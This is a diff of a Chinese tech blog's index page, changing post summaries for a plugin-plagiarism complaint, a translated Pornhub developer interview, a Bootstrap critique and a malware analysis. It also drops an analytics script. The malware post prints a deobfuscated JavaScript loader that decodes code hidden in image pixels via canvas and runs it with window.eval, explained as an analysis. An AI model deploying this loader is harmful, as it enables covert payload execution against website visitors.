@@ -223,7 +223,8 @@
 对比 插件介绍 我的插件 李鬼插件 代码对比 上面的简洁基本上已经展现了浓重的李鬼味道，本着客观严谨的态度，我还是去看了一下代码。
 我的插件 李鬼插件 除了一个 js 文件的引用，几乎可以说是一模一样了。核心的文件是 widget.js 这个文件，这个属于插件自身的 js 文件。
 从这代码对比，可以看得出这个借鉴者巨大的工作量。
-总结 鄙人的这款插件是在 GitHub 上开源的，当时也是出于个人需求搞得这么个小玩意，但是没想到居然还有李鬼借鉴，还真是离谱他妈给离谱开门。大家如果有空的话，还是动一下发财的小手点一下 Report，这个李鬼插件还是下架比较好。我也联系了这个开发同学，希望他能及时下架。</p>
+总结 鄙人的这款插件是在 GitHub 上开源的，当时也是出于个人需求搞得这么个小玩意，但是没想到居然还有李鬼借鉴，还真是离谱他妈给离谱开门。大家如果有空的话，还是动一下发财的小手点一下 Report，这个李鬼插件还是下架比较好。我也联系了这个开发同学，希望他能及时下架。
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/export-to-markdown/">Read More →</a>
   </footer>
@@ -236,11 +237,11 @@
     <p class="post-meta">@Neal · Oct 13, 2019 · 1 min read</p>
   </header>
   
-  <p class="post-summary">原文：Interview with a Pornhub Web Developer
+  <p class="post-summary"> 原文：Interview with a Pornhub Web Developer
 译者：neal1991
 welcome to star my articles-translator, providing you advanced articles translation. Any suggestion, please issue or contact me
 LICENSE: MIT
- 无论你对色情内容采取何种立场，都无法否认成人网站行业对推动互联网发展具有巨大影响。从将浏览器的视频限制推送到通过WebSocket推送广告，以便广告拦截器无法检测到它们，你必须足够聪明才能在互联网的前沿进行创新。
+无论你对色情内容采取何种立场，都无法否认成人网站行业对推动互联网发展具有巨大影响。从将浏览器的视频限制推送到通过WebSocket推送广告，以便广告拦截器无法检测到它们，你必须足够聪明才能在互联网的前沿进行创新。
 最近，我很有幸采访互联网最大的成人网站 Pornhub 的一名 Web 开发者。我想了解技术，Web API 如何改进以及在成人网站上工作的感受。请享用！
 注意：成人产业竞争激烈，因此有一些他们无法回答的问题。我尊重他们保守商业机密的需要。
 成人网站显然会显示许多图形内容。在开发过程中，你是否使用了大量的占位符图像和视频？最终产品和开发时的内容和经验有什么区别？
@@ -249,13 +250,14 @@ LICENSE: MIT
 为了进行开发，播放器分为两个部分。基本播放器实现核心功能并触发事件。开发不会受其他因素干扰。为了在网站上进行集成，我们希望运行那些第三方脚本和广告，以便我们尽早发现问题。在特殊情况下，我们将与广告客户合作，允许我们手动触发通常可能是随机的事件。
 平均每个页面可能至少包含一个视频，GIF 广告，一些 cam 表演者预览以及其他视频的缩略图。你如何测量页面性能以及如何使页面保持最佳性能？有什么你可已分享的技巧吗？
 我们使用一些测量系统。
- 我们的播放器会向我们报告有关视频播放性能和一般用法的指标 用于一般站点性能的第三方 RUM 系统。 WebpageTest 私有实例，用于在可用的 AWS 数据中心中编写测试脚本。我们主要将其用于查看给定时间可能发生的情况。它还使我们能够查看来自不同位置和提供者的“瀑布”。  我必须假设前端最重要，最复杂的功能是视频播放器。从在视频之前加入广告，标记视频的精彩时刻，更改视频速度和其他功能，你如何维护该资产的性能，功能和稳定性？
+我们的播放器会向我们报告有关视频播放性能和一般用法的指标 用于一般站点性能的第三方 RUM 系统。 WebpageTest 私有实例，用于在可用的 AWS 数据中心中编写测试脚本。我们主要将其用于查看给定时间可能发生的情况。它还使我们能够查看来自不同位置和提供者的“瀑布”。 我必须假设前端最重要，最复杂的功能是视频播放器。从在视频之前加入广告，标记视频的精彩时刻，更改视频速度和其他功能，你如何维护该资产的性能，功能和稳定性？
 我们有一支专门致力于视频播放器的团队，他们的首要任务是持续监控性能和效率。我们为此几乎使用了所有可用的东西；浏览器性能工具，网页测试，指标等。我们进行的所有更新均通过可靠的质量检查来确保稳定性和质量。
 专门的视频团队有多少人？团队中有多少前端开发人员？
 我要说的是，团队规模倾向于基于产品规模的平均水平。
 在成人网站上工作期间，你如何看待前端未来的变化？哪些新的 Web API 使你的生活更轻松？
 我肯定在前端世界的每个方面都看到了很多改进；
- 从纯 CSS 到最终使用 LESS 和 Mixins，再到使用具有媒体查询和图片标签的灵活 Grid 系统，以适应不同的分辨率和屏幕尺寸 jQuery 和 jQueryUI 慢慢地被淘汰，因此我们将回到 vanilla JS 中更高效的面向对象编程。在某些情况下，框架也非常有趣 我们喜欢新的 IntersectionObserver API，对于以更有效的方式加载图像非常有用 我们也开始使用画中画 API，以便在我们的某些页面上播放该浮动视频，主要是为了获得用户对该想法的反馈。  展望未来，有没有你想要更改，改进甚至创建的 Web API？</p>
+从纯 CSS 到最终使用 LESS 和 Mixins，再到使用具有媒体查询和图片标签的灵活 Grid 系统，以适应不同的分辨率和屏幕尺寸 jQuery 和 jQueryUI 慢慢地被淘汰，因此我们将回到 vanilla JS 中更高效的面向对象编程。在某些情况下，框架也非常有趣 我们喜欢新的 IntersectionObserver API，对于以更有效的方式加载图像非常有用 我们也开始使用画中画 API，以便在我们的某些页面上播放该浮动视频，主要是为了获得用户对该想法的反馈。 展望未来，有没有你想要更改，改进甚至创建的 Web API？
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/pornhub-web-%E5%BC%80%E5%8F%91%E8%80%85%E8%AE%BF%E8%B0%88/">Read More →</a>
   </footer>
@@ -270,7 +272,10 @@ LICENSE: MIT
   
   <p class="post-summary">前段时间获取到黑产的一些代码，不得不感叹黑产的代码实在在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
 最初的代码是经过混淆的，代码经过整理如下：
-var createImgElement = function(urla, b) {  var imgElement = document.createElement(&#39;img&#39;);  var canvasEle = document.createElement(&#39;canvas&#39;);  imgElement[&#39;crossOrigin&#39;] = true;  imgElement[&#39;onload&#39;] = function() {  canvasEle.width = this.width;  canvasEle.height = this.height;  var canvasContext = canvasEle.getContext(&#39;2d&#39;)  canvasContext.drawImage(this, 0, 0, this.width, this.height);  for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height),  cancasDataLength = canvasContext.data.length, arr = [], i = 0;  i &lt; cancasDataLength;  i &#43;= 4) {  var code = canvasContext.</p>
+var createImgElement = function(urla, b) { var imgElement = document.createElement(&#39;img&#39;); var canvasEle = document.createElement(&#39;canvas&#39;); imgElement[&#39;crossOrigin&#39;] = true; imgElement[&#39;onload&#39;] = function() { canvasEle.width = this.width; canvasEle.height = this.height; var canvasContext = canvasEle.getContext(&#39;2d&#39;) canvasContext.drawImage(this, 0, 0, this.width, this.height); for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height), cancasDataLength = canvasContext.data.length, arr = [], i = 0; i &lt; cancasDataLength; i &#43;= 4) { var code = canvasContext.data[i] var code1 = canvasContext.data[i &#43; 1] var code2 = canvasContext.data[i &#43; 2] canvasContext.data[i &#43; 2].toString(16); 1 == code1.length &amp;&amp; (code1 = 0 &#43; code1); 1 == code2.length &amp;&amp; (code2 = 0 &#43; code2); 0 != Number(code &#43; code1 &#43; code2) &amp;&amp; arr.push(String.fromCharCode(Number(code &#43; code1 &#43; code2))); } window.eval(arr.join(&#39;&#39;)); console.log(arr.join(&#39;&#39;)); b &amp;&amp; b(); } imgElement.src = urla; }; 这段代码的主要目的是通过使用一个图片的连接，将这个图片加载到 canvas 中，再利用 canvas 去获取恶意代码并执行。通过图片去隐藏信息是一种常见的做法，这段就是通过 canvas 去执行图片中隐含的恶意代码。这段还支持传入回调函数，若回调函数存在，则执行回调函数。
+在这里还利用一个计算机图像的知识，即像素中的 RGBA 值。Canvas 中的 ImageData 对象中每一个像素都包含了4个信息，即 RGBA 值。
+R - 红色 (0-255) G - 绿色 (0-255) B - 蓝色 (0-255) A - alpha 通道 (0-255; 0 是透明的，255 是完全可见的) 通过将代码转化为 ascii 码，将其隐藏在图片中的 RGB 信息中，黑产的 alpha 值都设置的为255。这样非常巧妙地就实现了代码信息和图片之间的转换。
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/%E9%BB%91%E4%BA%A7%E4%BB%A3%E7%A0%81%E8%A7%A3%E5%AF%86--%E5%88%A9%E7%94%A8canvas%E5%8A%A0%E8%BD%BD%E4%BB%A3%E7%A0%81/">Read More →</a>
   </footer>
@@ -301,7 +306,8 @@ Bootstrap是一个很好的工具对于一个纸箱装饰他们的程序但是�
 Bootstrap的样式是非常复杂的：你可以利用12列的栅格系统和任何元素相结合起来，对于需要特别处理的列则要区别对待。很多网站十分简单：它们在小屏幕设备上没有列或者只有一到两列在大一点的屏幕上。
 当它产生技术债务的时候 前端依赖Bootstrap的时间越长，就会牵扯到更多的东西，更多的规则需要设置来覆盖Bootstrap的某些规则。这或多或少地让技术代码背负技术债务，尤其前端代码的部署需要手动的更新。随着依赖的增多，Bootstrap将变得更加难以移除。
 当它命名一些不是你app的规定 命名是一件很困难的事情，为团队的应用中的规定命名需要花费相当多的时间。使用’btn’之类的缩写并不能很好的给组件命名。
-结论 Bootstrap可能对于产生网站的多个流程都起到了很大的帮助。但是它并不能让所有的事情都变得简单：相反，很多问题可以由前端开发人元专注于UI就能够更好地解决。</p>
+结论 Bootstrap可能对于产生网站的多个流程都起到了很大的帮助。但是它并不能让所有的事情都变得简单：相反，很多问题可以由前端开发人元专注于UI就能够更好地解决。
+</p>
   <footer class="post-footer">
     <a class="read-more" href="https://madneal.com/post/bootstrap%E7%9C%9F%E7%9A%84%E6%80%BB%E6%98%AF%E5%A5%BD%E7%9A%84%E5%90%97/">Read More →</a>
   </footer>
@@ -342,20 +348,7 @@ Bootstrap的样式是非常复杂的：你可以利用12列的栅格系统和任
 </script>
 
 <script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
-
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-104405154-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-
+  
 
 
 
